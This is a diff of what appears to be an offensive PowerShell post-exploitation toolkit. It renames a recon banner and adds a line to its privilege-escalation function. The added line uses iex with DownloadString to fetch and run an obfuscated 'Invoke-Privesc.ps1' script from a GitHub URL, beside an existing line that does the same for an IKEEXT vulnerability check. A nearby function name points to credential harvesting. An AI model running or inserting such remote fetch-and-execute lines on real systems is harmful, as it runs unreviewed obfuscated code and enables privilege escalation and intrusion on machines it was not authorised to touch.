@@ -1337,7 +1337,7 @@ __        ___       ____
   \ V  V / | | | | |  __/ \ V  V /| | | |
    \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
 
-   --> Localreconmodules
+   --> Domainreconmodules
 
 '@
     
@@ -1758,7 +1758,8 @@ function privescmodules
     
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/IkeextCheck.ps1')
     Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
-    
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
+    Invoke-PrivescCheck >> "$currentPath\LocalPrivEsc\PrivescCheck.txt"
 }
 
 function lazagnemodule
